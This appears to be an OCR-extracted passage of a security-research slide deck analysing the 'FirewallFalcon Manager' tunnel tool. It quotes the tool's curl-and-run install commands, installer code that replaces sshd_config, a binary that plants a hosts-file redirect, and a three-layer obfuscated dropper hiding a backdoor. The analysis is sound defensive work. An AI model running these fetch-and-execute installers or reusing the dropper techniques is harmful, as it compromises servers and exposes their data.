> Recovered by OCR — confidence 85/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Overview
Inbounds
Panel Settings
Xray Configs
Log Out
® Security Alert
This connection is not secure. Please avoid entering sensitive information until TLS is activated for data protection.
0.25%
CPU: 2 Cores
Version: | X-UI 1.10.1 Xray 26.2.6
Xray: Running | Stop Restart
System Load: 0.05 | 0.23| 0.13
Server: FlareResearch ) | |Pv4
4 Up: 304 B/s
23.85% 0% 5.77%
RAM: 1.85 GB / 7.75 GB Swap: 0B/0B Disk: 4.42 GB / 76.45 GB
\ Down: 463 B/s
Manage: Logs Config Backup & Restore
Usage: RAM 22.08 MB | Threads 15
& Out: 301.89 MB ® In: 1.01 GB
```

## Slide 64

**LET’S PLAY**


> Recovered by OCR — confidence 94/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S PLAY
Ubuntu 24.04.3 LTS | Uptime: 11 hours, 54 minutes
y 5.78% Used | Online Sessions: @
@ Managed Accounts | Sys Load (1m): @.01
Create New User Unlock User Account
Delete User Edit User Details
Renew User Account List Managed Users
Lock User Account Generate Client Config
Protocol Manager Traffic Monitor (Lite)
DT Proxy Manager Block Torrent (Anti-P2P)
CloudFlare Free Domain Backup User Data
SSH Banner Config Restore User Data
Auto-Reboot Task Cleanup Expired Users
Uninstall Script @] Exit
an option: fj
```

## Slide 65

**LET’S PLAY**


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S PLAY
Ubuntu 24.04.3 LTS | Uptime: 11 hours, 59 minutes
7.95% Used | Online Sessions: @
@ Managed Accounts | Sys Load (1m): @.28
[ 1] 4 Install DT Tunnel (Mod + Proxy)
[ 2] Launch DT Tunnel Management Menu
—~ Uninstall DT Tunnel (Mod + Proxy)
[ @] M Return to Main Menu
@ Select an option: J
```

## Slide 66

**LET’S PLAY**


> Recovered by OCR — confidence 82/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S PLAY
DTunnel Proxy Menu
[e1]
[e2]
[e3]
[00] e EXIT
@ Enter your choice: 1
@ Port: 4
© #7 Enable SSL? (y/n) [n]: y
«© [& Use internal certificate? (y/n) [yl]: y
@ Default HTTP response [FirewallFalcon]: facebook.com
@ @ Enable SSH-only mode? (y/n) [nl]: y
Created symlink /etc/systemd/system/multi-user.target.wants/proxy—-4.service > /etc/systemd/system/proxy—4.service.
7 Proxy started on port 4.
@ Press Enter to continue...
```

## Slide 67

**WHAT IS DTUNNEL?**


> Recovered by OCR — confidence 83/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WHAT IS DTUNNEL?
DTunnel
@dtunnel - 343 subscribers - 9 videos
More about this channel ...more
Home Videos Shorts _Live Q
CG 25 dtunnel.com.br/login
© DTUNNEL
Total control,
Descrigdo do uso da
premium interface.
189 views
Access your exclusive control panel to manage tunnels, monitor connectio Videos
and configure integrations through an elegant and easy-to-use interface.
DTUNNEL PROTOCOLO COM i Ativando fungao no Dtunnel - i DTunnel - GERANDO : DTUNNEL - COMO ALTERAR i TUTORIAL V2RAY DTUNNEL i DTUNNEL - IMPORTAR
‘SUPORTE A XHTTI Modo avido automatico APLICATIVO AS CREDENCIAIS (USER_ID) K view! years ago CONFIGURACAO,
895 views + 3 mont! 979 views + 2 years agi
```

## Slide 68

**DTUNNEL REGISTRATION**


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DTUNNEL REGISTRATION
Create account
Fillin your details to access the new panel.
First name Last name
@gmail.com
Password Confirm password
Register
Already have an account? Sign in
```

## Slide 69

**DTUNNEL REGISTRATION**


> Recovered by OCR — confidence 91/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DT
D
Jo
DTunnel
Control Center
Home
Settings
App
Texts
Renew
Transactions
Notifications
Devices
Sessions
Profile
Active session
Renew
Choose a plan, apply a coupon if you want, and generate the renewal payment via PIX or card.
RENEWAL PLAN
Plano Mensal
Renewal for 01 meses
01 MESES
FINAL AMOUNT
BASE PRICE
APPLIED DISCOUNT
Payment method
$2 PIX © Card
Choose a payment method to continue.
Discount coupon
Enter a discoul Apply
Available
RENEWAL PLAN Available
Plano Trimestral
Renewal for 03 meses
03 MESES
FINAL AMOUNT
BASE PRICE
APPLIED DISCOUNT
RS$0.00
Payment method
2 PIX ®B Card
Choose a payment method to continue.
Discount coupon
Enter a discoui Apply
RENEWAL PLAN Available
Vitalicio
Renewal for 2739 anos
2739 ANOS
FINAL AMOUNT
R$250.00
BASE PRICE
APPLIED DISCOUNT
Payment method
2 PIX ® Card
Choose a payment method to continue
Discount coupon
Enter a discoul Apply
© Renew now
RENEWAL PLAN Available
Plano Anual
Renewal for 01 ano
01 ANO
FINAL AMOUNT
BASE PRICE
APPLIED DISCOUNT
Payment method
Choose a payment method to continue.
Discount coupon
Enter a discoui Apply
& Renew now
```

## Slide 70

**I’M FALLING IN LOVE**

## Slide 71

## Slide 72

### **FOUR INTERESTING ELEMENTS IN THE TOOL**

## Slide 73

**REMEMBER THIS ONE…**


> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
REMEMBER THIS ONE...
root@ip-—172-31-32-128:~# curl -L -o install.sh "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager
/main/install.sh" && chmod +x install.sh && sudo ./install.sh && rm install.sh
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
10@ 2124 100 2124 () @ 13355 Q@ --t--8-— ti 3-3 -— 13443
sudo: unable to resolve host in-172-31-32-128: Name or service not known
Installing FirewallFalcon Manager...
Applying FirewallFalcon SSH configuration...
SSH configuration validated.
SSH service restarted.
%Initializing FirewallFalcon Manager setup...
a
Configuring user limiter service...
@ Setup finished.
Installation complete!
Type 'menu' to start.
```

## Slide 74

### **CHECKING UNDER THE HOOD**

**I know it’s too small don’t worry**


> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHECKING UNDER THE HOOD
echo "Installing FirewallFalcon Manager..."
# URLs (IPv4 forced to avoid GitHub IPv6 issues)
# Install menu
wget -4 -q -0 /usr/local/bin/menu “$MENU_URL"
chmod +x /usr/local/bin/menu
ec ‘Applying FirewallFalcon SSH configuration..."
SSHD_CONFIG="/etc/ssh/sshd_config"
BACKUP="/etc/ssh/sshd_config.backup.$(date +%F-%H%M%S )"
# Backup current SSH config
cp "“$SSHD_CONFIG" "$BACKUP"
# Download FirewallFalcon SSH config
wget —4 -q -0 "“$SSHD_CONFIG" "$SSHD_URL"
# Validate SSH config (silent)
if ! sshd -t 2>/dev/null; then
echo "ERROR: SSH configuration is invalid!"
echo "Restoring previous configuration..."
cp "$BACKUP" "$SSHD_CONFIG"
exit 1
fi
echo "SSH configuration validated."
+flare
I know it’s
too small
don’t
worry
```

## Slide 75

**CHECKING UNDER THE HOOD**


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHECKING UNDER THE HOOD C)
echo "Installing FirewallFalcon Manager..."
```

## Slide 76

**CHECKING UNDER THE HOOD**


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHECKING UNDER THE HOOD C)
echo "Installing FirewallFalcon Manager..."
SSHD_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager/main/ssh"
```

## Slide 77

**CHECKING UNDER THE HOOD**


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHECKING UNDER THE HOOD C)
echo "Installing FirewallFalcon Manager...
SSHD_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager/main/ssh"
# Download FirewallFalcon SSH config
wget -4 -q -0 "$SSHD_CONFIG" "$SSHD_URL"
chmod 6@@ "$SSHD_CONFIG"
```

## Slide 78

**CHECKING UNDER THE HOOD**


> Recovered by OCR — confidence 88/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHECKING UNDER THE HOOD C)
echo "Installing FirewallFalcon Manager..."
SSHD_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager/main/ssh"
# Download FirewallFalcon SSH config
wget -4 -q -0 "$SSHD_CONFIG" "$SSHD_URL"
chmod 60@ "$SSHD_CONFIG"
SSHD_CONFIG="/etc/ssh/sshd_config"
```

## Slide 79

**CHECKING UNDER THE HOOD**


> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHECKING UNDER THE HOOD
echo "Installing FirewallFalcon Manager..."
SSHD_URL="https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon—Manager/main/ssh"
# Download FirewallFalcon SSH config
wget -4 -q -0 "$SSHD_CONFIG" "$SSHD_URL"
chmod 6@@ "$SSHD_CONFIG"
SSHD_CONFIG="/etc/ssh/sshd_config"
if ! sshd -t 2>/dev/null; then
echo "ERROR: SSH configuration is invalid!"
echo "Restoring previous configuration..."
cp "“$BACKUP" "$SSHD_CONFIG"
exit 1
```

## Slide 80

### **CHECKING UNDER THE HOOD**

→ **"/etc/ssh/sshd_config"**


> Recovered by OCR — confidence 87/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHECKING UNDER THE HOOD
€ Cc 23 codeberg.org/firewallfalcons/FirewallFalcon-Manager/raw/branch/main/ssh
# FIREWALLFALCON
#
Port 22
Protocol 2
KeyRegenerationInterval 3600
ServerKeyBits 1024
SyslogFacility AUTH
LogLevel INFO
lo yes
RSAAuthentication yes
PubkeyAuthentication yes
RhostsRSAAuthentication no > /etc/ss h/sshd config
HostbasedAuthentication no =
PermitEmptyPasswords no
B e bhentication no
Xl1DisplayOffset 10
PrintMotd no
PrintLastLog yes
TCPKeepAlive yes
#UseLogin no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
UsePAM yes
Banner /etc/bannerssh
```

## Slide 81

**BUT, OPENING SSH TO THE INTERNET IS PART OF THE TOOL…**

## Slide 82

### **FOUR INTERESTING ELEMENTS IN THE TOOL**

## Slide 83

**REMEMBER THIS ONE…**


> Recovered by OCR — confidence 81/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
REMEMBER THIS ONE...
[e1]
[e2]
[e3]
[00] e EXIT
@ Enter your choice: 1
@ Port: 4
© #7 Enable SSL? (y/n) [n]: y
«© [& Use internal certificate? (y/n) [yl]: y
@ Default HTTP response [FirewallFalcon]: facebook.com
@ @ Enable SSH-only mode? (y/n) [nl]: y
Created symlink /etc/systemd/system/multi-user.target.wants/proxy—-4.service > /etc/systemd/system/proxy—4.service.
7 Proxy started on port 4.
@ Press Enter to continue...
```

## Slide 84

### **CHECKING UNDER THE HOOD**

**I know it’s too small don’t**

**I know it’s too small don’t**

**worry**

**worry**


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHECKING UNDER THE HOOD
install_dt_proxy_full() {
cle show_banner
echo -e “${C_BOLD}${C_PURPLE}— Y Full DT Tunnel Installation ---${C_RESET}"
if [ -f "/usr/local/bin/main" ]; then
echo -e "\n${C_YELLOW} [il DT Proxy appears to be already installed.${C_RESET}"
echo -e “If you wish to reinstall, please uninstall it first."
return
fi
echo -e "\n${C_BLUE}--- Step 1 of 2: Installing DT Tunnel Mod ---${C_RESET}"
| know it S echo "This will download and run the prerequisite mod installer."
read -p "# Press [Enter] to continue or [Ctrl+C] to cancel."
too sma [| if curl -sL https://raw.githubusercontent.com/firewallfalcons/ProxyMods/main/install.sh | bash; then
echo -e "\n${C_GREEN}@ DT Tunnel Mod installed successfully. ${C_RESET}"
else
d 't echo -e "\n${C_RED} ERROR: DT Tunnel Mod installation failed. Aborting.${C_RESET}"
Oo n return
fi
worr echo -e "\n${C_BLUE}--- Step 2 of 2: Installing DT Tunnel Proxy ---${C_RESET}"
echo "This will download and run the main DT Tunnel proxy installer."
read -p “# Press [Enter] to continue or [Ctrl+C] to cancel."
if bash <(curl -fsSL https://raw.githubusercontent.com/firewallfalcons/ProxyDT-Go-Releases/main/install.sh); then
echo -e "\n${C_GREEN}@ DT Tunnel Proxy installed successfully.${C_RESET}"
echo -e "You can now manage it from the DT Proxy Management menu."
else
echo -e "\n${C_RED}X ERROR: DT Tunnel Proxy installation failed.${C_RESET}"
fi
+flare
I know it’s
too small
don’t
worry
```

## Slide 85

**CHECKING UNDER THE HOOD**


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHECKING UNDER THE HOOD C)
if curl -sL https://raw.githubusercontent.com/firewallfalcons/ProxyMods/main/install.sh | bash; then
echo -e "\n${C_GREEN}@ DT Tunnel Mod installed successfully.${C_RESET}"
```

## Slide 86

**CHECKING UNDER THE HOOD**


> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHECKING UNDER THE HOOD
#!/b
set -e
echo "firewallfalcon" > "$HOME/.proxy_token"
URL_X86_64="https://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/install_mod"
FILENAME="install_mod"
echo "# Detecting your server's architecture..."
ARCH=$(uname —m)
case $ARCH in
x86_64
echo "@ Detected x86_64 (Intel/AMD 64-bit)."
aarch64
echo "@ Detected aarch64 (ARM 64-bit)."
DOWNLOAD_URL=""$URL_ARM64"
echo Unsupported architecture: $ARCH"
echo "This installer only supports x86_64 and aarch64."
exit 1
”
+flare
```

## Slide 87

**CHECKING UNDER THE HOOD**


> Recovered by OCR — confidence 90/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHECKING UNDER THE HOOD
#!/b
set -e
echo "firewallfalcon" > "$HOME/.proxy_token"
URL_X86_6 ttps://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/install_mod"
URL_ARM64: ttps://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/Arminstall_mod"
echo "# Detecting your server's architecture..."
ARCH=$(uname —m)
case $ARCH in
x86_64
echo "@ Detected x86_64 (Intel/AMD 64-bit).
aarch64
echo "@ Detected aarch64 (ARM 64-bit)."
DOWNLOAD_URL=""$URL_ARM64"
echo Unsupported architecture: $ARCH"
echo "This installer only supports x86_64 and aarch64."
exit 1
”
```

## Slide 88

### **CHECKING UNDER THE HOOD**

**I know it’s too small don’t**

**worry**

**I know it’s too small don’t worry**


> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHECKING UNDER THE HOOD
I know it’s
too small
don’t
worry
root@ip-172-31-32-128:~# curl -k https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
{"data":{"is_valid":true}, "status":200}
root@ip—172-31-32-128:~# curl -vk https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
Host proxy.dtunnel.com.br:443 was resolved.
IPv6: (none)
IPv4: 89.168.51.93
Trying 89.168.51.93:443...
Connected to proxy.dtunnel.com.br (89.168.51.93) port 443
ALPN: curl offers h2,http/1.1
TLSv1.3 (OUT), TLS handshake, Client hello (1
TLSv1.3 (IN), TLS handshake, Server hello (2)
TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
TLSv1.3 (IN), TLS handshake, Certificate (11)
TLSv1.3 (IN), TLS handshake, CERT verify (15):
TLSv1.3 (IN), TLS handshake, Finished (20):
TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
TLSv1.3 (OUT), TLS handshake, Finished (20):
SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 / X25519 / RSASSA-PSS
ALPN: server accepted h2
Server certificate:
subject: Cl roxy.dtunnel.com.br
start date: Sep 23 12:46:25 2025 GMT
expire date: Aug 2 12:46:25 2035 GMT
issuer: CN=proxy.dtunnel.com.br
SSL certificate verify result: self-signed certificate (18), continuing anyway.
Certificate level @: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
using HTTP/2
CHTTP/2] [1] OPENED stream for https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
CHTTP/2] [1] [:method: GET]
CHTTP/2] [1] [:scheme: https]
CHTTP/2] [1] [:authority: proxy.dtunnel.com.br]
CHTTP/2] [1] [:path: /api/v1/token/validate/firewallfalcon]
CHTTP/2] [1] [user-agent: curl/8.5.0]
CHTTP/2] [1] Laccept: */*]
GET /api/v1/token/validate/firewallfalcon HTTP/2
Host: proxy.dtunnel.com.br
User-Agent: curl/8.5.0
Accept: */*
3
3
3
3
3
3
HTTP/2 200
content-type: application/json
date: Mon, 09 Mar 2026 23:40:47 GMT
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
*
>
>
>
>
>
<
<
<
<
<
{"data":{"is_valid":true}, "status":200}
* Connection #@ to host proxy.dtunnel.com.br left intact
I know it’s
too small
don’t
worry
```

## Slide 89

**CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN)**


> Recovered by OCR — confidence 80/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN) a
root@ip-172—-31-32-128:~# cat .proxy_token
firewallfalcon
root@ip-172-31-32-128:~# curl -k https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
{"data":{"is_valid":true}, "status":200}
root@ip-172-31-32-128:~# ff
```

## Slide 90

**CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN)**


> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN)
root@ip-172-31-32-128:~# curl -vk https://proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
Host proxy.dtunnel.com.br:443 was resolved.
IPv6: (none)
IPv4: 89.168.51.93
Trying 89.168.51.93:443...
Connected to proxy.dtunnel.com.br (89.168.51.93) port 443
ALPN: curl offers h2,http/1.1
*
*
*
*
*
*
```

## Slide 91

### **CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN)**

89.168.51.93


> Recovered by OCR — confidence 85/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CHECKING UNDER THE HOOD (LET’S BREAK IT DOWN) a
root@ip-172-31-32-128:~# curl -vk httpse#/7proxy.dtunnel.com.br/api/v1/token/validate/firewallfalcon
Host proxy.dtunnel.com.br:443 wasfesolved.
IPv4: 89.168.51.93 a
Trying 89.168.51.93:443...
Connected to proxy.dtunnel.com.br (89.168.51.93) port 443
ALPN: curl offers h2,http/1.1
*
*
*
*
*
*
```

## Slide 92

**DIG TO DTUNNEL FROM A CLEAN VM**


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DIG TO DTUNNEL FROM A CLEAN VM
ubuntu@FlareResearch:~$ dig proxy.dtunnel.com.br
; <<>> DIG 9.18.39-@ubuntu@.24.04.2—Ubuntu <<>> proxy.dtunnel.com.br
+; global options: +cmd
7; Got answer:
7} —>>HEADER<<- opcode: QUERY, status: NOERROR, id: 56082
i; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: @, ADDITIONAL: 1
7; OPT PSEUDOSECTION:
; EDNS: version: @, flags:; udp: 65494
77 QUESTION SECTION:
;proxy.dtunnel.com.br. IN
7; ANSWER SECTION:
proxy.dtunnel.com.br. 300 IN 104.21.81.128
proxy.dtunnel.com.br. 300 IN 172.67.160.230
37 Query time: 39 msec
7; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
7; WHEN: Mon Mar @9 23:43:12 UTC 2026
77 MSG SIZE revd: 81
ubuntu@FlareResearch:~$ ff
```

## Slide 93

### **DIG TO DTUNNEL FROM A CLEAN VM**

104.21.81.128

172.67.160.230


> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DIG TO DTUNNEL FROM A CLEAN VM
ubuntu@FlareResearch:~$ dig proxy.dtunnel.com.br
; <<>> DIG 9.18.39-@ubuntu@.24.04.2—Ubuntu <<>> proxy.dtunnel.com.br
+; global options: +cmd
7; Got answer:
3 —>>HEADER<<- opcode: QUERY, status: NOERROR, id: 56082
i; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: @, ADDITIONAL: 1
; EDNS: version: @, flags:; udp: 65494 ® ® e
77 QUESTION SECTION:
;proxy.dtunnel.com.br. IN
7; ANSWER SECTION:
proxy.dtunnel.com.br. 300 IN 104.21.81.128
proxy.dtunnel.com.br. 300 IN 172.67.160.230
37 Query time: 39 msec
;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
7; WHEN: Mon Mar @9 23:43:12 UTC 2026
```

## Slide 94

**API AUTHENTICATION TO DTUNNEL FROM A CLEAN VM**


> Recovered by OCR — confidence 82/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
API AUTHENTICATION TO DTUNNEL FROM A CLEAN VM a
ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ cat .proxy_token
firewallfalcon
ubuntu@FlareResearch: ~/Research/February-26/Fir 11Falcon$ curl -k https://proxy.dtunnel.c
```

## Slide 95

**API AUTHENTICATION TO DTUNNEL FROM A CLEAN VM**


> Recovered by OCR — confidence 84/100 on the text kept, 51/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
API AUTHENTICATION TO DTUNNEL FROM A CLEAN VM a
ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ cat .proxy_token
firewallfalcon
ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ curl -k https://proxy.dtunnel.c
{"data":{"error":"'ip_address'"},"status":500}
root@ip-—172-31-32-128:~# cat .proxy_token
firewallfalcon
```

## Slide 96

**LET’S CHECK THE HOSTS FILE**


> Recovered by OCR — confidence 88/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S CHECK THE HOSTS FILE
root@ip-172-31-32-128:~# cat /etc/hosts && echo
127.0.@.1 localhost
The following lines are desirable for IPv6é capable hosts
89.168.51.93 proxy.dtunnel.com.br
root@ip-172-31-32-128:~# ff
```

## Slide 97

**LET’S CHECK THE HOSTS FILE**

## Slide 98

**REMEMBER THIS ONE…**


> Recovered by OCR — confidence 90/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
REMEMBER THIS ONE...
#!/b
set -e
echo "firewallfalcon" > "$HOME/.proxy_token"
URL_X86_6 ttps://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/install_mod"
URL_ARM64: ttps://github.com/firewallfalcons/ProxyMods/raw/refs/heads/main/Arminstall_mod"
echo "# Detecting your server's architecture..."
ARCH=$(uname —m)
case $ARCH in
x86_64
echo "@ Detected x86_64 (Intel/AMD 64-bit).
aarch64
echo "@ Detected aarch64 (ARM 64-bit)."
DOWNLOAD_URL=""$URL_ARM64"
echo Unsupported architecture: $ARCH"
echo "This installer only supports x86_64 and aarch64."
exit 1
”
+flare
```

## Slide 99

**LET’S CHECK THIS BINARY (INSTALL_MOD)**


> Recovered by OCR — confidence 82/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S CHECK THIS BINARY (INSTALL_MOD)
; DATA XREF: main_main+B4to
; Main_main: loc_4A7AFBrto
Loc_4A7AFB: ; Name
lea rax, aEtcHosts ; "/etc/hosts"
mov ebx, Ah > Name
mov ecx, 401h ; flag ; const uint8 aEtcHosts
mov edi, 1A4h + perm aEtcHosts db '/etc/hosts'
call os_OpenFile
err = rbx >; error_O
test err, err
jnz loc_4A7C1D
movups xmmword ptr [rsp+4F@h+a.cap], xmm15
loc_4A7C1D: lea rdx, main_main_deferwrap1
add rsp, 4E8h mov [rsp+4F@h+a.cap], rdx
pop rbp mov [rsp+4FQh+var_18], f
retn lea rdx, [rsp+4F0h+a.cap]
mov [rsp+4F@h+var_10], rdx
mov [rsp+4F@h+var_4BF], 1
lea err, a891685193Proxy_@ ; "\n89.168.51.93 proxy.dtunnel.com.br"
neg rbx
xchg ax, ax
cmp rbx, 22h ; ‘"'
jb loc_4A7C41
```

## Slide 100

**LET’S CHECK THIS BINARY (INSTALL_MOD)**


> Recovered by OCR — confidence 79/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S CHECK THIS BINARY (INSTALL_MOD)
local_49e = 0x4745422d2d2d2d2d;
local_496._@ 8 = 0x4954524543204e49;
pcVar2 =
MxptFP4NfcUQSj+3KSD4U40 LU+ZUJKFuj YNM7Ur3NzDyBa2 idyP6\n2CQvpIPaBcRmj bt2913QU2qW+St35VTaMGJ ruqZZgHga
@kh21PYHf35sSj do5EFHi653\nBay/Ucl82K9TpVTAQyFZ1YzYUxs4WLuutBY kwkzc jN8RZSFHQ6y j XueIgoSXVEsX\nIhFhv1
puVar3 = (undefined8 *)(local_496 + 6);
for (lWarl = Ox8c; lVarl != @; Warl = lWarl + -1) {
x*puVar3 = *(undefined8 *)pcVar2;
pcVar2 = pcVar2 + ((ulong)bVar5 * -2 + 1) * 8;
puVar3 = puVar3 + (ulong)bVar5 * -2 + 1;
auVar6 = os.WriteFile(@x46e, 0x46e, 0x4954524543204e49, &local_49e, 0x1a4);
return;
lWar4 = @;
os/exec.Command(0,0,auVar6._8 8 ,0);
Warl = os/exec. (*Cmd) .Run();
if (Wari != 0) {
return;
os.ReadFile();
if (lVar4 == 0) {
Warl = strings. Index(0x21);
if (lVar1 < @) {
os. OpenFile(0x1a4) ;
return;
```

## Slide 101

**LET’S CHECK THIS BINARY (INSTALL_MOD)**


> Recovered by OCR — confidence 72/100 on the text kept, 38/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LET’S CHECK THIS BINARY (INSTALL_MOD)
: auVar6 = os.WriteFile(0x46e, 0x46e, 0x4954524543204e49, &local_49e, @x1a4) ;
epuver} = e(undet return;
pcVaer? = ocVar? « ({ }
U
at cammianame lVar1 = os/exec. (*Cmd).Run();
if (ivera = @) {
if (Wert <@) {
```

## Slide 102

**THIS SHOULDN’T BE THERE**

## Slide 103

### **FOUR INTERESTING ELEMENTS IN THE TOOL**

## Slide 104

**REMEMBER THIS ONE…**


> Recovered by OCR — confidence 83/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
REMEMBER THIS ONE...
Firewallfalcon Manager ¢
Free installation, supports all types of CPU.
curl -L -o install.sh
"https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-
Manager/refs/heads/main/install.sh” && chmod +x install.sh &&
sudo ./install.sh && rm install.sh
= d 7 91 a 1 © 2608 edited 2:15PM
```

## Slide 105

### **GIT CLONE --MIRROR**

## **JUNE-NOVEMBER 2025**


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
GIT CLONE --MIRROR C)
case "$(uname -m)" in
x86_64) curl -L -o 64install.sh ".../main/64install.sh" G&& sudo ./64install_v3.sh G& rm...
aarch64|arm64) curl -L -o arminstall.sh ".../main/arminstall.sh" && sudo ./arminstall.sh && rm...
JUNE-NOVEMBER 2025
```

## Slide 106

### **64INSTALL_V3.SH IS A THREE-LAYER DROPPER**

**Layer 1: Bash self-extractor** Encrypted and obfuscated payload embedded inside the script

## Slide 107

### **64INSTALL_V3.SH IS A THREE-LAYER DROPPER**

**Layer 1: Bash self-extractor** Encrypted and obfuscated payload embedded inside the script **Layer 2: SHC-compiled ELF** Does arc4-decrypt and runs

## Slide 108

### **64INSTALL_V3.SH IS A THREE-LAYER DROPPER**

**Layer 1: Bash self-extractor** Encrypted and obfuscated payload embedded inside the script

**Layer 2: SHC-compiled ELF** Does arc4-decrypt and runs

**Layer 3: A management tool** Hides a backdoor and enables data exfiltration

## Slide 109

**LAYER1 OF 64INSTALL_V3.SH**


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LAYER1 OF 64INSTALL_V3.SH
#!/bin/bash
# This is a self-extracting installer. The binary payload is appended after the ‘exit' command.
# [MODIFIED] The final command will be named ‘menu'
p="/usr/local/bin/menu"
# Helper function for error messages
e(){ echo “Error: $1" >&2; exit 1; }
# -—-- Pre-flight Checks ---
# 1. Must be run as root
[[ $EUID -ne 0 ]] && e "This installer must be run with root privileges."
# 2. Check for ‘bc' which is required by the main script, and install if missing
command —v bc &>/dev/null || {
echo "The 'bc' utility is required. Attempting to install..."
# Try apt first, then yum for broader compatibility
apt-get update &>/dev/null && apt-get install -y bc &/dev/null || yum install -y bc &/dev/null || e "Failed to install 'bc'.
```

## Slide 110

**LAYER1 OF 64INSTALL_V3.SH**


> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LAYER1 OF 64INSTALL_V3.SH
# --- Extraction Logic -—--
# Find the line number where the payload starts
l=$(grep -axn '*# --- PAYLOAD START --- DO NOT EDIT BELOW THIS LINE ---$' "$@" | cut -d:
[ -z "$l" ] && e "Installer is corrupted or incomplete. Cannot find payload."
